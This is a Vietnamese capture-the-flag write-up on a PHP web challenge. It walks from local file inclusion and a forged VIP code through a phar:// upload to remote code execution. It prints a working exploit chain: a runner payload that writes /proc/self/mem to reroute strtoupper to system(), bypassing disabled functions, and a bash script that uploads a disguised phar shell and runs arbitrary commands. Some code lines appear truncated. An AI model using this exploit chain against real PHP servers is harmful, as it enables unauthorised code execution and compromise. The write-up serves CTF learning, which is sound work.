

---
Tài liệu/Bài báo tham khảo:
https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html
https://hacktricks.wiki/en/pentesting-web/file-inclusion/phar-deserialization.html
https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-dl-function.html

---

![Pasted image 20261025112448](Attachments/Pasted%20image%2020261025112448.png)

Nhìn vào giao diện của trang web mình quan sát thấy có 2 nút chuyển hướng là "Join us" và "Login", khi ấn vào thì luôn trỏ đến /?page=login.php

![Pasted image 20261028103624](Attachments/Pasted%20image%2020261028103624.png)


Mình thử SQL injection thì thấy:
![Pasted image 20261028103719](Attachments/Pasted%20image%2020261028103719.png)

Sau đó mình FUZZ một lúc thì cũng chẳng thấy gì đặc biệt. Mình nghĩ có thể là Error-based hay gì đó nhưng không thấy gì đặc biệt nên tạm thời đi theo hướng khác trước.


Như nãy mình có nhắc đến /?page=login.php á. Mình thấy cái này khá dị, chắc hẳn cách setup này có liên quan đến một lỗ hỏng nào đó nên mình thử đôi /?page=random, random.php xem:

![Pasted image 20261028104023](Attachments/Pasted%20image%2020261028104023.png)

Hehe, màn hình hiện ra một thông báo lỗi. Mình thấy ngay đây là lỗ hỏng LFI.

Dựa vào một cái trick trên Hacktricks thì mình thành công leak được source code của app:
![423](Attachments/Pasted%20image%2020261028104407.png)

```
/?page=php://filter/convert.base64-encode/resource=index.php
```
![Pasted image 20261028104814](Attachments/Pasted%20image%2020261028104814.png)


Decode ra thì ta đọc được source code của các endpoint như sau:
- Index.php:
```php
<?php
ob_start();
session_start(); // Start session before any HTML output

// only allow php files to be included
if (isset($_GET['page']) && strlen($_GET['page']) < 1000 && preg_match('/^.*\.ph(p|ps|tml)/', $_GET['page'])) {
    // prevent directory traversal
    $page = $_GET['page'];
    while (substr_count(urldecode($page), '../', 0)) {
        $page = str_replace('../', '', urldecode($page));
    };
} else {
    // default to home page
    $page = "home.php";
}
?>

...html here
```

- login.php:
```php
<?php
// redirect on direct access
if (__FILE__ === realpath($_SERVER['SCRIPT_FILENAME'])) {
    header('Location: index.php?page=login.php');
}

if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    if (strpos($username, "'") !== false || strpos($username, '"') !== false ||
        strpos($password, "'") !== false || strpos($password, '"') !== false) {
        http_response_code(500);
        die("Database Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" . htmlspecialchars($username) . "' at line 1");
    }
    $error = "Invalid credentials";
}

if (isset($_POST['vip_code']) && !empty($_POST['vip_code'])) {
    $code = $_POST['vip_code'];

    if (strpos($code, "'") !== false || strpos($code, '"') !== false) {
        http_response_code(500);
        die("Database Error: You have an error in your SQL syntax near '" . htmlspecialchars($code) . "'");
    }

    // require_once('apply.php');

    function validate_vip_code($code) {
        $pattern = '/^CYBER2026-[A-Z]{3}[0-9]{4}[!@#$%][A-Z]{2}_[0-9]{6}$/';
        return preg_match($pattern, $code) === 1;
    }

    if (validate_vip_code($code)) {
        $_SESSION["logged"] = true;
        echo '<script>window.location.href = "index.php?page=apply.php";</script>';
        exit();
    } else {
        $error = "Invalid VIP access code format";
    }
}
?>

... html here

```

- upload.php:
```php
<?php
session_start();

if (isset($_SESSION["logged"])) {
    $target_dir = "./user_submissions/";
    $fileName = basename($_FILES["uploadFile"]["name"]);
    $target_file = $target_dir . $fileName;

    if (strpos($fileName, '.php') !== false) {
        echo "Extension not allowed";
        die();
    }

    if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
        echo "Only images are allowed";
        die();
    }

    if ($_FILES["uploadFile"]["size"] > 500000) {
        echo "File too large";
        die();
    }

    if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
        echo "File successfully uploaded";
    } else {
        echo "File failed to upload";
    }
} else {
    echo "Only logged in users can upload files";
}

```

Oke, nhìn vào đây ta thấy ngay cái thông báo Database lỗi kia là cú lừa thế kỉ :)) App thậm chí còn không có database và validate người dùng cực kì sơ sài bằng Regex:
```php
    function validate_vip_code($code) {
        $pattern = '/^CYBER2026-[A-Z]{3}[0-9]{4}[!@#$%][A-Z]{2}_[0-9]{6}$/';
        return preg_match($pattern, $code) === 1;
    }

    if (validate_vip_code($code)) {
        $_SESSION["logged"] = true;
        echo '<script>window.location.href = "index.php?page=apply.php";</script>';
        exit();
    } else {
        $error = "Invalid VIP access code format";
    }
}
```
Nhìn vào Regex kia thì mình dễ dàng tạo được một Vip Code cho riêng mình:
`CYBER2026-ABC1307!OK_999999`
và thành công đăng nhập được:


Khi đăng nhập thành công thì có một trang Apply với chức năng Upload avatar:
![Pasted image 20261028105911](Attachments/Pasted%20image%2020261028105911.png)
![Pasted image 20261028110349](Attachments/Pasted%20image%2020261028110349.png)


Nhìn vào source code ta có thể thấy server validate file được upload lên như sau:
```php
$target_dir = "./user_submissions/";
    $fileName = basename($_FILES["uploadFile"]["name"]);
    $target_file = $target_dir . $fileName;

    if (strpos($fileName, '.php') !== false) {
        echo "Extension not allowed";
        die();
    }

    if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
        echo "Only images are allowed";
        die();
    }
```
- File được upload vào thư mục ./user_submissions
- File không được có đuôi .php
- Dùng regex và kiểm tra xem tên file có `.<extension ảnh>` trong đó không

Đến đây thì mình thử áp dụng một số cái trick như kiểu thêm Null Byte:
- abc.php%00.png
Có nhiều extension:
- abc.php.png 
Mình cũng thử Fuzz các fileName dạng:
- `abc.php<FUZZ>.png`
- `abc.php<FUZZ>abc.png`

Nhưng đều không được. Thế là mình nghĩ đến việc upload file .htaccess để có thể chỉnh cấu hình server cho phép coi một đuôi file ảnh có thể execute:

```htaccess
AddType application/x-httpd-php .png
```

Nhưng cái khó ở đây là mặc dù server không cấm .htaccess nhưng server yêu cầu đuôi file phải là ảnh bằng regex. Dẫn đến việc upload cực khó.
![Pasted image 20261028111714](Attachments/Pasted%20image%2020261028111714.png)

Mình nhập filename là .htaccess%00.png thì được, nhưng sau đó mình không xem được file .htaccess của server:
![Pasted image 20261028111929](Attachments/Pasted%20image%2020261028111929.png)
Mình cũng đã thử đọc .htaccess bằng LFI nhưng có điều server chỉ cho đọc file .php nên không được.

Nhưng mình vẫn thử upload file payload.png với nội dung
`<?php system('id') ?>`

Nhưng server vẫn chỉ coi đó là file ảnh và không execute được:
![Pasted image 20261028112355](Attachments/Pasted%20image%2020261028112355.png)
![Pasted image 20261028112440](Attachments/Pasted%20image%2020261028112440.png)
Chứng tỏ .htaccess của mình chưa được upload thành công ?

Thế là mình quyết định chuyển sang hướng đi khác, lúc này mình mới nhớ lại nãy mình có bắt gặp LFI, mình nghĩ không biết mình có thể kết hợp nó với File upload để làm điều gì đó không?

Mình lướt thử ở Hacktricks thì thấy có một vài cái payload khá thú vị sử dùng input://, expect://,.. mình đã thử hết và đến phar:// thì có tiến triển:
![636](Attachments/Pasted%20image%2020261028204734.png)

![Pasted image 20261028112900](Attachments/Pasted%20image%2020261028112900.png)


Mình bật chế độ script kiddie và copy một script trên đó về tạo payload:
![Pasted image 20261028211001](Attachments/Pasted%20image%2020261028211001.png)

Mình compile ra và đổi payload thành đuôi file ảnh, do mình hỏi AI thì nó bảo phar:// không quan tâm đuôi file mà chỉ quan tâm nội dung bên trong:
![Pasted image 20261028211249](Attachments/Pasted%20image%2020261028211249.png)

Và buồn thay cách này ko được:)) mình quên mất là chỉ được include đuôi file .php:D

![Pasted image 20261028212252](Attachments/Pasted%20image%2020261028212252.png)

Thế là mình thử sửa đoạn này chút thành test.php sau đó test lại:
![Pasted image 20261028212519](Attachments/Pasted%20image%2020261028212519.png)

Yayyyyy, thế là mình RCE thành công!!!!
Nhưng mà server đã chặn system() 😭😭😭

Mình thử nhiều hàm khác thì chỉ file_get_contents() hoạt động... Và làm vậy mình đã đọc được flag ở challenge cho phép hướng unintended:
![Pasted image 20261028212825](Attachments/Pasted%20image%2020261028212825.png)

Nhưng đến Revenge thì đã không còn /flag.txt nên mình bắt buộc phải có RCE thật sự:
![Pasted image 20261028212900](Attachments/Pasted%20image%2020261028212900.png)

Mình đã thử mọi loại hàm có thể giúp RCE trên đời nhưng không thể nào RCE được 💔 mình nản quá nên quyết định slop bằng AI agent tạo ra một PoC sử dụng kĩ thuật Mem-patch mà mình chỉ hiểu được nguyên lý chứ không hiểu code như thế nào;-;
Các bạn có thể đọc giải thích của AI agent ở đây nhé [Slop mem patch with AI agent](Slop%20mem%20patch%20with%20AI%20agent.md)

PoC:

runner_payload.php:
```php
$b=0;
foreach(file('/proc/self/maps') as $l){ if(strpos($l,'libphp.so')!==false && preg_match('/^([0-9a-f]+)-[0-9a-f]+ .... 00000000 /',$l>
$m=fopen('/proc/self/mem','r+b');
function rr($a,$n){global $m;fseek($m,$a);$s='';while(strlen($s)<$n){$x=fread($m,$n-strlen($s));if($x===''||$x===false)break;$s.=$x;>
function uu($a,$n){$s=rr($a,$n);$v=0;for($i=$n-1;$i>=0;$i--)$v=($v<<8)|ord($s[$i]);return $v;}
function ww($a,$s){global $m;fseek($m,$a);return fwrite($m,$s);}
function fti($p){$ar=uu($p+16,8);$nu=uu($p+24,4);$ns=uu($p+32,4);if($ar<0x1000||$nu==0||$nu>$ns||$ns>200000)return null;return array>
function gfn($p,$want){$t=fti($p);if(!$t)return null;list($ar,$nu)=$t;$wl=strlen($want);for($i=0;$i<$nu;$i++){$bk=$ar+$i*32;$k=uu($b>
$eg=$b+15122944; $ft=uu($eg+432,8); $fp=gfn($ft,'strtoupper'); $sys=$b+3440272;
if($fp && uu($fp+56,8)!==$sys) ww($fp+56,pack('P',$sys));
$cmd=base64_decode($_GET['x']);
echo "__B__\n";
if($cmd!==''){
  $o='/tmp/x.out'; @unlink($o);
  $f=$cmd.' > '.$o.' 2>&1; chmod 644 '.$o;
  if($fp) strtoupper($f);
  echo @file_get_contents($o);
}
echo "\n__E__\n";
```


rce.sh:
```bash
#!/usr/bin/env bash
# PoC RCE - BKSec "Three Steps to Heaven Revenge"
# Usage: ./poc_rce.sh [base_url] [command]
# Example: ./poc_rce.sh https://web-...training.bksec.vn/ 'id; /readflag'
set -u
DIR="$(cd "$(dirname "$0")" && pwd)"
B="${1:-https://web-3-steps-to-heaven-revenge-fcc3c83a769a.training.bksec.vn/}"
CMD="${2:-id}"
CJ="$DIR/.poc_cookies.txt"
PHAR="$DIR/phar_multi.jpg"
CODE='CYBER2026-ABC1234@XY_123456'
LFI="$B/index.php?page=phar:///var/www/html/user_submissions/phar_multi.jpg/shell.php"

rm -f "$CJ"

# 1) Login bang VIP code hop le
curl -s -c "$CJ" -b "$CJ" -m 20 -X POST "$B/index.php?page=login.php" \
  --data-urlencode "vip_code=$CODE" -o /dev/null || exit 1

# 2) Upload PHAR shell duoi .jpg
UP=$(curl -s -c "$CJ" -b "$CJ" -m 30 -X POST "$B/upload.php" \
  -F "uploadFile=@$PHAR;filename=phar_multi.jpg;type=image/jpeg")
case "$UP" in
  *"successfully"*) : ;;
  *) echo "[!] Upload that bai: $UP" >&2; exit 1 ;;
esac

# 3) Ghi runner vao /tmp/r.php (noi dung runner_payload.php, eval khong can <?php)
RB64=$(base64 -w0 "$DIR/runner_payload.php")
WRITE="file_put_contents('/tmp/r.php',base64_decode('$RB64'));"
W64=$(printf '%s' "$WRITE" | base64 -w0)
curl -s -b "$CJ" -m 30 -G "$LFI" \
  --data-urlencode "b64=$W64" -o /dev/null

# 4) Thuc thi lenh qua mem-patch (strtoupper handler -> zif_system)
X=$(printf '%s' "$CMD" | base64 -w0)
EV=$(printf '%s' "eval(file_get_contents('/tmp/r.php'));" | base64 -w0)
curl -s -b "$CJ" -m 40 -G "$LFI" \
  --data-urlencode "b64=$EV" --data-urlencode "x=$X" \
  | awk '/__B__/{f=1;next}/__E__/{f=0}f'
```

